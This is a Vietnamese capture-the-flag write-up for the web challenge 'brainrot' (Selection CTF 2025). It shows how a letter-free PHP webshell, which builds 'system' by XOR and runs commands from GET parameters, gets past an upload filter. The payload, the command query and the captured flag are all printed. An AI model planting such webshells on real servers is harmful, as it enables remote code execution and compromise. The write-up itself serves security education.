# Writeup Selection CTF 2025 (Web)
# brainrot
- Author: **d4kw1n**
- Mô tả của thử thách: 
 ![image](https://hackmd.io/_uploads/S1V8Tr64xl.png)
## Liệt kê
- Đầu tiên chúng ta cùng truy cập vào trang web tương ứng với url: http://61.14.233.78:8888
 ![image](https://hackmd.io/_uploads/SkBtpr6Vlg.png)
- Tại đây ở trang web xuất hiện với những mô tả mà author đưa ra nói về những toán học kèm theo phần có thể upload 1 file lên thì đầu tiên thấy upload file mình nghỉ đến ngay là upload một hình ảnh và thực hiện RCE như thường lệ nhưng cuộc đời mà chắc có gì dễ dãi đến vậy =)))
- Sau khi upload 1 hình ảnh thì nó trả về như sau:
 ![image](https://hackmd.io/_uploads/BJwEAraNxx.png)
- Nói rằng ko được phép upload hình ảnh có chữ cái tức là những: **File chứa ký tự alphabet (a-zA-Z), không được phép upload.**
- Sau một hồi mình cứ ngồi mày mò tìm payload trên payloadAllTheThing thì không có gì xảy ra vì mỗi webshell đều có kí tự chữ cái
- Và mình nghỉ rằng là hầu hết các WAF lọc rất nhiều ký tự có sẵn khiến việc khai thác trở nên khó khăn hơn. Và trong đó các Các ký tự phổ biến bị chặn hoặc lọc là **a-zA-Z**
- Lúc đầu đã có những shell không phải chữ và số nhưng những shell tôi thấy đều có một điểm chung là chúng cần dấu ngoặc kép để tạo thành một chuỗi một lần để tạo ra các chữ cái từ chuỗi đó.
- Sau quá trình tìm kiếm một số case tầm khoảng 2-3h đồng hồ tôi phát hiện được 1 shell có thể bao gồm toàn kí tự chữ số và kí tự đặc biệt không có chữ cái và có thể vượt qua bộ lọc của server.
## Khai Thác
```php
<?=$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
```
- Ở payload này theo như tìm hiểu của mình và có sự hỗ trợ của chat gpt thì mình được hiểu là payload này nó sử dụng xây dựng tên hàm "system" thông qua phép XOR và toán tử đặc biệt sau đó thực thi lệnh từ $_GET[1] mà không gọi trực tiếp từ khóa bị cấm nào. Mnguoi có thể tìm hiểu payload trên ở gg để hiểu rõ hơn nữa.
- RỒi bây giờ để chắc chắn hơn mình sẽ kiểm tra chúng xem có kí tự chữ cái ko.
 ![image](https://hackmd.io/_uploads/H1LlEU6Nex.png)
- Kết quả đầu ra không hiển thị chữ cái chứng tỏ mình đã vượt qua điều đó và ở phần upload này nó không kiểm tra định dạng file upload nên mình sẽ lưu payload trên để upload file php.
 ![image](https://hackmd.io/_uploads/HytSVUTNeg.png)
- Chúng ta đã vượt qua được bộ lọc bây giờ có thể RCE
 ![image](https://hackmd.io/_uploads/BJfYV8a4ee.png)
- Xảy ra lỗi Array to string conversion và sau khi tìm hiểu chúng ta có thể được khắc phục bằng cách thêm **@** vào phần truy vấn mong muốn thực hiện ép kiểu.
- Payload cuối cùng: 
```php
<?=@$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
```
 ![image](https://hackmd.io/_uploads/SJUyr8pNlx.png)
- Rồi thực hiển RCE với param payload **?0=system&1=id** thực thi id thông qua system ở param 1
 ![image](https://hackmd.io/_uploads/rkCXB8TNxx.png)
- Rồi bây giờ mục tiêu cờ ở đâu cùng thực hiện ls / để xem file cờ.
 ![image](https://hackmd.io/_uploads/SkrISUp4ll.png)
- Và cuối cùng chúng ta cùng lấy flag
 ![image](https://hackmd.io/_uploads/rkcdSUp4lg.png)
- Flag: **VSL{7e56ae1036160bceaedde8032663810308bd57c1}**


